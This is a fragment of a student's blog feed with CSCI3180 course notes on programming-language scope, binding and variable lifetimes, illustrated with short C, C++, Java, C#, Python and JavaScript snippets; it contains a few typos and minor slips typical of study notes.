<li>Reusing name in nested blocks is only legal in <code>C</code> and <code>C++</code>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line">        std::cout &lt;&lt; x &lt;&lt; std::endl; <span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; std::endl; <span class="comment">// 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>;  <span class="comment">// error - already defined</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Declaration-Order"><a href="#Declaration-Order" class="headerlink" title="Declaration Order"></a>Declaration Order</h3><ul>
<li><p>Some old languages (<code>C89</code>) require variable declaration <font color="3A75EA">at the top</font> of the function</p>
<ul>
<li>In <code>C89</code> compiler, the variable should be declare before the loop  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// int i;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123; <span class="comment">// error</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hi &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>C99</code>, <code>C++</code>, <code>Java</code>, <code>C#</code> allow variable declarations appear <font color="3A75EA">anywhere</font></p>
<ul>
<li><p>In <code>C99</code>, <code>C++</code>, <code>Java</code>, the scope of all local variables is <font color="F54747">from the declaration to the end of the block</font></p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// OK in Java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>But in <code>C#</code>, the scope of any variable declared in a block is the <font color="F54747">whole block</font></p>
  <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Not ok in C#</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> x = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> x = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Global-Scope"><a href="#Global-Scope" class="headerlink" title="Global Scope"></a>Global Scope</h3><ul>
<li>The scope in which variables and functions are visible to the entire program (including in other files)  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// File 1</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> i = <span class="number">99</span>;  <span class="comment">// CAN define it again in other file</span></span><br><span class="line"><span class="type">int</span> g = <span class="number">100</span>;    <span class="comment">// CANNOT define it again in other file</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> j;   <span class="comment">// extern needed, if you want to declare a variable from other file</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;    <span class="comment">// 99</span></span><br><span class="line">    std::cout &lt;&lt; j &lt;&lt; std::endl;    <span class="comment">// 777</span></span><br><span class="line">    std::cout &lt;&lt; g &lt;&lt; std::endl;    <span class="comment">// 100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// File 2</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> i = <span class="number">1234</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">777</span>;</span><br><span class="line"><span class="type">int</span> g = <span class="number">0</span>;  <span class="comment">// illegal</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;    <span class="comment">// 1234</span></span><br><span class="line">    std::cout &lt;&lt; j &lt;&lt; std::endl;    <span class="comment">// 777</span></span><br><span class="line">    std::cout &lt;&lt; g &lt;&lt; std::endl;    <span class="comment">// Compilation error: &#x27;g&#x27; has already been defined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Python-Scope"><a href="#Python-Scope" class="headerlink" title="Python Scope"></a>Python Scope</h3><ul>
<li><p>Global variable</p>
<ul>
<li>It can be referenced in <font color="3A75EA">all functions</font></li>
<li>It can be assigned if it has been declared to be global using the keyword <code>global</code> in the function  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="string">&quot;global&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">global</span> g</span><br><span class="line">    g = <span class="string">&quot;local&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;from f(), &quot;</span>, g)  <span class="comment"># local</span></span><br><span class="line">f()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;from glocal, &quot;</span>, g)   <span class="comment"># local</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Nonlocal variable</p>
<ul>
<li>It can be referenced in the <font color="3A75EA">inner functions</font></li>
<li>It can be assigned if it has been declared to be nonlocal using the keyword <code>nonlocal</code> in the function</li>
<li><font color="F54747">NOTED: The <code>nonlocal</code> only refers to the nearest static ancestors</font></li>
<li><font color="F54747">NOTED: The <code>nonlocal</code> only works for nonlocal variables, which means it cannot refer to a global variable</font>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sub1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sub1&quot;</span>)</span><br><span class="line">    x = <span class="string">&quot;modified at sub1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sub2</span>():</span><br><span class="line">        <span class="comment"># nonlocal x</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sub2&quot;</span>)</span><br><span class="line">        x = <span class="string">&quot;modified at sub2&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sub3</span>():</span><br><span class="line">            <span class="keyword">nonlocal</span> x  <span class="comment"># goes into the static parent (sub2)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sub3&quot;</span>)</span><br><span class="line">            x = <span class="string">&quot;modified at sub3&quot;</span></span><br><span class="line"></span><br><span class="line">        sub3()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x from sub2:&quot;</span>, x)   <span class="comment"># x from sub2: modified at sub3</span></span><br><span class="line"></span><br><span class="line">    sub2()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x from sub1:&quot;</span>, x)   <span class="comment"># x from sub1: modified at sub1</span></span><br><span class="line"></span><br><span class="line">sub1()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Dynamic-Scope"><a href="#Dynamic-Scope" class="headerlink" title="Dynamic Scope"></a>Dynamic Scope</h2><ul>
<li><p>The scope of a variable is determined by the order of function calls at runtime rather than by the static structure of the program</p>
<ul>
<li>Temporal</li>
<li>Can only be determined at runtime  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">big</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&quot;hehe&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sub1</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> x = <span class="string">&quot;haha&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sub2</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">sub1</span>()</span><br><span class="line">        <span class="keyword">var</span> y = x</span><br><span class="line">        <span class="keyword">var</span> z = <span class="string">&quot;hoho&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">sub2</span>()</span><br><span class="line">    <span class="title function_">print</span>(x)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">big</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// static scoping: hehe</span></span><br><span class="line"><span class="comment">// dynamic scoping: haha</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><font color="F54747"><strong>Advantages</strong></font>:<ol>
<li>Convenience<ul>
<li>Variables from the caller are <font color="3A75EA">implicitly</font> visible in the callee</li>
</ul>
</li>
</ol>
</li>
<li><font color="F54747"><strong>Disadvantages</strong></font>:<ol>
<li>Reliability<ul>
<li>The variables are visibile to all subprograms it calls</li>
<li>Impossible to statically type check</li>
</ul>
</li>
<li>Hard to understand<ul>
<li>the variable value can be different every time</li>
</ul>
</li>
<li>Costly runtime</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="Referencing-Environments"><a href="#Referencing-Environments" class="headerlink" title="Referencing Environments"></a>Referencing Environments</h2><ul>
<li><p>A data structure that stores all variable names that are visible at the statement</p>
</li>
<li><p>Static-scoped language:</p>
<ul>
<li>local variables + all visible variables in all <font color="F54747">enclosing scopes</font></li>
</ul>
</li>
<li><p>Dynamic-scoped language</p>
<ul>
<li>local variables + all visible variables in all <font color="F54747">active subprograms</font> in calling sequence</li>
<li><font color="F54747">active subprograms&lt;</font>: the execution has begun but not yet terminated</li>
</ul>
</li>
<li><p>Practice 1: Python Scoping</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="string">&quot;global doge&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub1</span>():</span><br><span class="line">    h = <span class="string">&quot;husky&quot;</span> </span><br><span class="line">    <span class="comment"># Point (1)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sub2</span>():</span><br><span class="line">        <span class="keyword">global</span> g</span><br><span class="line">        c = <span class="string">&quot;corgi&quot;</span></span><br><span class="line">        <span class="comment"># Point (2)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sub3</span>():</span><br><span class="line">            <span class="keyword">nonlocal</span> c</span><br><span class="line">            g = <span class="string">&quot;meow&quot;</span></span><br><span class="line">            <span class="comment"># Point (3)</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center">Point</th>
<th align="center">Referencing Environment</th>
</tr>
</thead>
<tbody><tr>
<td align="center">(1)</td>
<td align="center"><font color="3A75EA">local h</font> (reference &amp; assignment), <font color="3A75EA">global g</font> (reference only)</td>
</tr>
<tr>
<td align="center">(2)</td>
<td align="center"><font color="3A75EA">local c</font> (reference &amp; assignment), <font color="3A75EA">global g</font> (reference and assignment), <font color="3A75EA">nonlocal h</font> (reference only)</td>
</tr>
<tr>
<td align="center">(3)</td>
<td align="center"><font color="3A75EA">local g</font> (reference &amp; assignment), <font color="3A75EA">nonlocal c</font> (reference and assignment), <font color="3A75EA">nonlocal h</font> (reference only)</td>
</tr>
</tbody></table>
</li>
<li><p>Practice 2: Dynamic Scoping</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sub1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a, b</span><br><span class="line">    <span class="comment">//Point (1)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sub2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> b, c</span><br><span class="line">    <span class="comment">//Point (2)</span></span><br><span class="line">    <span class="title function_">sub1</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123; <span class="comment">//suppose main() is the program entry point</span></span><br><span class="line">    <span class="keyword">var</span> c, d</span><br><span class="line">    <span class="comment">//Point (3)</span></span><br><span class="line">    <span class="title function_">sub2</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center">Point</th>
<th align="center">Referencing Environment</th>
</tr>
</thead>
<tbody><tr>
<td align="center">(1)</td>
<td align="center">a and b (sub1), c (sub2), d (main)</td>
</tr>
<tr>
<td align="center">(2)</td>
<td align="center">b and c (sub2), d (main)</td>
</tr>
<tr>
<td align="center">(3)</td>
<td align="center">c and d (main)</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="Named-Constants"><a href="#Named-Constants" class="headerlink" title="Named Constants"></a>Named Constants</h2><ul>
<li><p>A variable that is bound to a value only <font color="F54747">once</font></p>
</li>
<li><p>The binding of values can be <font color="3A75EA">either static or dynamic</font></p>
</li>
<li><p><font color="F54747"><strong>Advantages</strong></font></p>
<ol>
<li>Readibility</li>
<li>Reliability</li>
<li>Possibility to parameterize a program</li>
</ol>
</li>
<li><p>Syntax:</p>
<ul>
<li><p><code>Java</code></p>
<ul>
<li><code>final</code>: dynamically bound</li>
</ul>
</li>
<li><p><code>C++</code></p>
<ol>
<li><code>const</code>: dynamically bound</li>
<li><code>constexp</code>: statically bound, must be evaluated at compile time</li>
</ol>
</li>
<li><p><code>C#</code></p>
<ol>
<li><code>readonly</code>: dynamically bound</li>
<li><code>const</code>: statically bound, must be evaluated at compile time</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="Scope-amp-Lifetime"><a href="#Scope-amp-Lifetime" class="headerlink" title="Scope &amp; Lifetime"></a>Scope &amp; Lifetime</h2><ul>
<li>Scope and lifetime are often closely related, but are different concepts</li>
<li>Example:  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> x;   <span class="comment">// static storage</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ha &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    f();</span><br><span class="line">    x = <span class="number">0</span>;  <span class="comment">// cannot be accessed</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Lifetime: <code>x</code> is static storage because of the keyword <code>static</code>, because all static storage variables are already existed in the data region</li>
<li>Scope: <code>x</code> cannot be accessed in the main function because of its scope, which is not related to the static storage</li>
</ul>
</li>
</ul>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Variables</title>
    <url>/myBlog/2023/02/08/2023/CSCI3180/2023-2-8-CSCI3180-Abstraction/</url>
    <content><![CDATA[<h2 id="Names-Design-Issues"><a href="#Names-Design-Issues" class="headerlink" title="Names Design Issues"></a>Names Design Issues</h2><ol>
<li><p>Length</p>
<ul>
<li>Too short cannot be connotative</li>
</ul>
</li>
<li><p>Special characters</p>
<ul>
<li><code>PHP</code>: all variables names must begin with <code>$</code></li>
<li><code>Perl</code>: all veriables names begin with special characters (<code>$</code>, <code>@</code>, <code>%</code>) that specify the variable’s type</li>
</ul>
</li>
<li><p>Case sensitivity</p>
<ul>
<li><code>C</code>, <code>C++</code>, <code>Java</code>, <code>C#</code>, <code>Perl</code>, <code>Python</code>, <code>Ruby</code>, <code>Swift</code>: sensitivity</li>
<li><code>VBA</code>, <code>Pascal</code>, <code>COBOL</code>: not sensitivity</li>
<li><code>Prolog</code>, <code>Haskell</code>, <code>Go</code>: the cases carry semantics</li>
<li><code>PHP</code>: variable names are sensitivity but function names are not</li>
<li>metrics:<ul>
<li><code>doge</code> - variable</li>
<li><code>Doge</code> - class</li>
<li><code>DOGE</code> - constant</li>
</ul>
</li>
</ul>
</li>
<li><p>Special words</p>
<ul>
<li>increase the readability</li>
<li>most of them are <font color="F54747">reserved words (keywords)</font> that cannot be redefined</li>
<li><code>Fortran</code> can be redefined, it is unreadable for some cases  <figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="comment">! unreadable example</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">if</span> .eq. <span class="keyword">then</span> <span class="keyword">then</span> <span class="keyword">if</span> = <span class="keyword">else</span> <span class="keyword">else</span> <span class="keyword">then</span> = <span class="keyword">if</span> <span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">! the actural meaning</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">if</span> == <span class="keyword">then</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> = <span class="keyword">else</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">then</span> = <span class="keyword">if</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Address"><a href="#Address" class="headerlink" title="Address"></a>Address</h2><ul>
<li><p>the <font color="F54747">memory address</font> with which it is associated</p>
</li>
<li><p>a variable can have no name</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span>* p = <span class="keyword">new</span> <span class="type">int</span>;   <span class="comment">// the variable has no name but a pointer points to it</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Address of the nameless variable is &quot;</span> &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Address of the pointer p is &quot;</span> &lt;&lt; &amp;p &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>a variable may have different addresses at different times during execution</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> c;  <span class="comment">// local variable</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    f();</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    f(); <span class="comment">// the local variable may have a different address when the function is called</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> d; <span class="comment">// the variable in the body of a loop is recreated in every iteraction</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h2><ul>
<li>the <font color="F54747">contents</font> of the location with which the variable is associated<ul>
<li><code>a = 5</code></li>
<li><font color="F54747">l-value</font> (<font color="3A75EA">left value</font>): the address of the variable</li>
<li><font color="F54747">r-value</font> (<font color="3A75EA">right value</font>): the value of the variable</li>
</ul>
</li>
</ul>
<h2 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h2><ul>
<li>the <font color="F54747">range of value</font> of variavle and the <font color="F54747">set of operations</font> that are defined for values of that type<ul>
<li>e.g. <font color="F54747">range of value</font>: range of <code>int</code> is between [-32768, 32767]</li>
</ul>
</li>
</ul>
<h2 id="Binding"><a href="#Binding" class="headerlink" title="Binding"></a>Binding</h2><ul>
<li>an <font color="F54747">association</font> between an <font color="3A75EA">entity</font>(實體) and an <font color="3A75EA">attribute</font>(屬性)<ul>
<li>e.g. between a <font color="3A75EA">variable</font> and its <font color="3A75EA">type or value</font></li>
<li>e.g. between an <font color="3A75EA">operation</font> and a <font color="3A75EA">symbol</font></li>
</ul>
</li>
</ul>
<h3 id="Binding-Time"><a href="#Binding-Time" class="headerlink" title="Binding Time"></a>Binding Time</h3><ul>
<li><p>the time at which a binding takes place</p>
</li>
<li><p>Possible binding time:</p>
<ol>
<li><p>Language design time</p>
<ul>
<li>bind operator symbols to operations</li>
</ul>
</li>
<li><p>Language implementation time</p>
<ul>
<li>bind floating point type to a representation</li>
</ul>
</li>
<li><p>Complie time</p>
<ul>
<li>bind a variable to a type in <code>C</code> or <code>Java</code></li>
</ul>
</li>
<li><p>Load time</p>
<ul>
<li>bind a <code>C</code> or <code>C++</code> static variable to a memory cell</li>
</ul>
</li>
<li><p>Runtime</p>
<ul>
<li>bind a nonstatic local variable to a memory cell</li>
</ul>
</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Noted</strong>:</font> </p>
<ul>
<li><code>1 - 4</code> is <font color="F54747">static</font>, which binds <font color="F54747">before</font> the runtime</li>
<li><code>5</code> is <font color="F54747">dynamic</font>, which binds <font color="F54747">at</font> the runtime</li>
<li>We prefer that do the binding before runtime, because it is more efficiency.</li>
</ul>
</li>
</ul>
<h3 id="Static-Binding"><a href="#Static-Binding" class="headerlink" title="Static Binding"></a>Static Binding</h3><ul>
<li><p>it first occurs <font color="F54747">before run time</font> and <font color="F54747">remains unchanged (the memory location) throughout program execution</font></p>
</li>
<li><p><font color="F54747">explicit declaration</font>顯性: program statement for <font color="3A75EA">declaration</font> (with types of variable)</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">999</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><font color="F54747">implicit declaration</font>隱性: <font color="3A75EA">default</font> mechanism for specifying types of variables (<code>Fortran</code>)</p>
  <figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="comment">! i, j, k are assumed to be integers</span></span><br><span class="line"><span class="comment">! r, s, t are assumed to be reals</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Dynamic-Binding"><a href="#Dynamic-Binding" class="headerlink" title="Dynamic Binding"></a>Dynamic Binding</h3><ul>
<li><p>it first occurs <font color="F54747">during execution</font> or can <font color="F54747">change during execution of the program</font> (<code>JavaScript</code>, <code>Python</code>, <code>PHP</code>)</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">2</span>, <span class="number">4.33</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line"><span class="built_in">list</span> = <span class="number">17.3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><font color="F54747"><strong>Advantages</strong></font>:<ol>
<li>flexibility (code generic)</li>
</ol>
</li>
<li><font color="F54747"><strong>Disadvantages</strong></font>:<ol>
<li>high cost</li>
<li>type error detection by compoler is difficult</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="Lifetime"><a href="#Lifetime" class="headerlink" title="Lifetime"></a>Lifetime</h2><ul>
<li><p>Storage Binding</p>
<ol>
<li><p><font color="F54747">Allocation</font>: </p>
<ul>
<li>getting an memory cell from some pool (stack&#x2F;heap) of available cells</li>
</ul>
</li>
<li><p><font color="F54747">Deallocation</font>: </p>
<ul>
<li>putting a cell back to the pool</li>
</ul>
</li>
</ol>
</li>
<li><p>Lifetime is the time period when it is bound to a particular memory cell (from allocated to deallocated).</p>
</li>
</ul>
<h3 id="Static-Variables"><a href="#Static-Variables" class="headerlink" title="Static Variables"></a>Static Variables</h3><ul>
<li><p>Bound to memory cells <font color="F54747">before execution begins</font> and remains bound to the <font color="3A75EA">same</font> memory cell <font color="F54747">throughout execution</font></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">0</span>;  <span class="comment">// global variable (static)</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> y = <span class="number">50</span>;  <span class="comment">// global variable (this static doesn&#x27;t mean static variable)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> z = <span class="number">100</span>;    <span class="comment">// local variable</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><p><font color="F54747"><strong>Advantages</strong></font>:</p>
<ol>
<li>Efficiency (direct addressing)</li>
<li>History-sensitive subprogram support</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Disadvantages</strong></font>:</p>
<ol>
<li>Lack of flexibility (cannot use for recursion)</li>
<li>No sharing of storage</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Stack-Dynamic-Variables"><a href="#Stack-Dynamic-Variables" class="headerlink" title="Stack-Dynamic Variables"></a>Stack-Dynamic Variables</h3><ul>
<li><p>Bound to stack memory cells <font color="F54747">when the function is called</font> and remains bound to the <font color="3A75EA">same</font> memory cell <font color="F54747">until the function is returned</font></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">999</span>;    <span class="comment">// stack-dynamic variable</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    f();</span><br><span class="line">    f();    <span class="comment">// has the same address (the memory cells for pervious function was removed)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><p><font color="F54747"><strong>Advantages</strong></font>:</p>
<ol>
<li>Can use for recursion</li>
<li>Conversation of storage</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Disadvantages</strong></font>:</p>
<ol>
<li>Overhead of allocation and deallocation</li>
<li>Inefficient references (indirect addressing)</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Explicit-Heap-Dynamic-Variables"><a href="#Explicit-Heap-Dynamic-Variables" class="headerlink" title="Explicit Heap-Dynamic Variables"></a>Explicit Heap-Dynamic Variables</h3><ul>
<li><p>Allocated and deallocated by <font color="F54747">explicit directives</font>, <font color="3A75EA">specified by the programmer</font>, which can take effect <font color="F54747">during execution</font></p>
</li>
<li><p><font color="F54747">Nameless</font>: can only access by pointers or references</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// *</span></span><br><span class="line">    <span class="type">int</span>* p = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">88</span>);   <span class="comment">// one single integer</span></span><br><span class="line">    <span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>[size]; <span class="comment">// an array of size integers</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// **</span></span><br><span class="line">    <span class="type">int</span>** pp = &amp;p;  <span class="comment">// pp -&gt; p -&gt; int(88)</span></span><br><span class="line">    Ingredient** ingredientStorage = <span class="keyword">new</span> Ingredient*[size]; <span class="comment">// Assignment 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><p><font color="F54747"><strong>Advantages</strong></font>:</p>
<ol>
<li>Flexibility</li>
<li>Storage efficiency (Dynamic storage management)</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Disadvantages</strong></font>:</p>
<ol>
<li>Time-inefficient</li>
<li>Unreliable (dealing with pointers)</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Implicit-Heap-Dynamic-Variables"><a href="#Implicit-Heap-Dynamic-Variables" class="headerlink" title="Implicit Heap-Dynamic Variables"></a>Implicit Heap-Dynamic Variables</h3><ul>
<li><p>Allocated and deallocated by <font color="F54747">assignment statement</font>, <font color="3A75EA">specified by the programmer</font>, which can take effect <font color="F54747">during execution</font></p>
